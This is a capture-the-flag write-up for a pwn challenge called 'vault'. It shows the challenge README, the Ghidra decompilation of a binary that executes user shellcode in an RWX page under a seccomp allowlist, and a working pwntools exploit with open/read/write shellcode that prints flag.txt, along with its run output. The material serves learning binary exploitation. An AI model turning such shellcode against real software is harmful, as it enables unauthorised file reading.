## First wave contained 5 pwn challenges.. solved em.. here's how..

**1st one**:  [download](https://github.com/TheGreenOfficial/pwn-archive/blob/main/pwn-archive/binaries/vault.zip)

```Read-Readme
Target: Ubuntu 24.04, glibc 2.39 (2.39-0ubuntu8.9), x86-64.

Files:
  vault                 the challenge binary
  libc.so.6             the exact libc the target runs against
  ld-linux-x86-64.so.2  the matching dynamic loader

Run locally against the provided libc so offsets match the live target:
  patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vault && ./vault
  # or, without patchelf:
  ./ld-linux-x86-64.so.2 --library-path . ./vault

The live target is reachable at the host:port shown for your instance.

do dis also : create flag.txt in current dir and put fah{congrutalion}

```

**patch elf**

```
skid@TheGreen:~/ctfs/new$  patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vault
```

**First run of binary**

```
skid@TheGreen:~/ctfs/new$ ./vault
=== Vault ===
send your shellcode (up to 4096 bytes), then EOF:
yooooooo
Segmentation fault         ./vault
skid@TheGreen:~/ctfs/new$
```

**Ghidra decompiled view**

```
====================================================================================================
FUNCTION: lockdown
ADDRESS : 00401236
====================================================================================================
void lockdown(void)

{
  undefined8 uVar1;
  long in_FS_OFFSET;
  uint local_54;
  undefined4 local_48 [14];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  uVar1 = seccomp_init(0x80000000);
  local_48[0] = 0x101;
  local_48[1] = 2;
  local_48[2] = 0;
  local_48[3] = 1;
  local_48[4] = 3;
  local_48[5] = 8;
  local_48[6] = 5;
  local_48[7] = 0x106;
  local_48[8] = 9;
  local_48[9] = 0xb;
  local_48[10] = 0xc;
  local_48[0xb] = 0xf;
  local_48[0xc] = 0x3c;
  local_48[0xd] = 0xe7;
  for (local_54 = 0; local_54 < 0xe; local_54 = local_54 + 1) {
    seccomp_rule_add(uVar1,0x7fff0000,local_48[local_54],0);
  }
  seccomp_load(uVar1);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
====================================================================================================
FUNCTION: main
ADDRESS : 00401319
====================================================================================================
undefined8 main(void)

{
  code *__buf;
  undefined8 uVar1;
  ssize_t sVar2;
  
  setvbuf(stdout,(char *)0x0,2,0);
  __buf = mmap((void *)0x0,0x1000,7,0x22,-1,0);
  if (__buf == (code *)0xffffffffffffffff) {
    perror("mmap");
    uVar1 = 1;
  }
  else {
    puts("=== Vault ===");
    puts("send your shellcode (up to 4096 bytes), then EOF:");
    sVar2 = read(0,__buf,0x1000);
    if (sVar2 < 1) {
      uVar1 = 1;
    }
    else {
      lockdown();
      (*__buf)();
      uVar1 = 0;
    }
  }
  return uVar1;
}
```

**Simplifyed version with comments**

```
// lockdown(): installs seccomp filter so you can only use these syscalls
void lockdown(void) {
    // allowlist of syscall numbers:
    // 0x101 = openat? no wait let's decode:
    // 0x101 = openat? actually: 257 = openat, 2 = open, 0 = read,
    // 1 = write, 3 = close, 8 = lseek, 5 = fstat, 0x106 = newfstatat,
    // 9 = mmap, 0xb = munmap, 0xc = brk, 0xf = rt_sigreturn,
    // 0x3c = exit, 0xe7 = exit_group
    // So: basically file I/O syscalls only. No execve, no socket.
    void *ctx = seccomp_init(0x80000000); // SCMP_ACT_KILL_PROCESS default
    int allowed[] = {257,2,0,1,3,8,5,0x106,9,11,12,15,60,231};
    for (int i = 0; i < 14; i++)
        seccomp_rule_add(ctx, 0x7fff0000 /* SCMP_ACT_ALLOW */, allowed[i], 0);
    seccomp_load(ctx);
}

int main(void) {
    setvbuf(stdout, NULL, 2 /* _IONBF */, 0); // unbuffered stdout

    // mmap(NULL, 4096, PROT_READ|WRITE|EXEC (7), MAP_PRIVATE|MAP_ANON (0x22), -1, 0)
    void *buf = mmap(NULL, 0x1000, 7, 0x22, -1, 0);
    //                      ^^^ RWX!  <-- this is the trick

    if (buf == MAP_FAILED) { perror("mmap"); return 1; }

    puts("=== Vault ===");
    puts("send your shellcode (up to 4096 bytes), then EOF:");

    ssize_t n = read(0, buf, 0x1000); // read raw bytes from stdin
    if (n < 1) return 1;

    lockdown();  // install seccomp BEFORE running your code
    ((void(*)())buf)(); // <-- jump into your shellcode
    return 0;
}
```

**Exploit writing..**

```
from pwn import *

context.arch = "amd64"

sc = asm("""
    lea rdi, [rip+p]      # rdi = pointer to "flag.txt" (rip-relative)
    xor esi, esi          # esi = 0  (O_RDONLY)
    xor edx, edx          # edx = 0  (mode, unused for open)
    mov eax, 2            # syscall 2 = open
    syscall               # open("flag.txt", O_RDONLY) -> fd in eax

    mov edi, eax          # edi = fd
    sub rsp, 0x100        # carve 0x100 bytes on stack for the read buffer
    mov rsi, rsp          # rsi = buffer
    mov edx, 0x100        # edx = 0x100 bytes to read
    xor eax, eax          # syscall 0 = read
    syscall               # read(fd, buf, 0x100) -> n in eax

    mov edx, eax          # edx = n (bytes actually read)
    mov edi, 1            # edi = 1 (stdout)
    mov rsi, rsp          # rsi = buffer
    mov eax, 1            # syscall 1 = write
    syscall               # write(1, buf, n) -> prints flag

    mov eax, 60           # syscall 60 = exit
    xor edi, edi          # exit code 0
    syscall               # exit(0)

p:
    .asciz "flag.txt"     # string; RIP-relative label for lea
""")

io = process(["./ld-linux-x86-64.so.2",
              "--library-path",
              ".",
              "./vault"])

io.recvuntil(b"EOF:")
io.send(sc)
io.shutdown("send")

print(io.recvall().decode())
```

**exploit run**

```
skid@TheGreen:~/ctfs/new$ ls
e.py  flag.txt  ld-linux-x86-64.so.2  libc.so.6  README.txt  vault  vault.ghidra-out  vault.zip
skid@TheGreen:~/ctfs/new$ python3 e.py
[+] Starting local process './ld-linux-x86-64.so.2': pid 2882
[+] Receiving all data: Done (19B)
[*] Process './ld-linux-x86-64.so.2' stopped with exit code 0 (pid 2882)

fah{congrutalion}

skid@TheGreen:~/ctfs/new$
```

**Try it yourself binary is there its self explaned..**
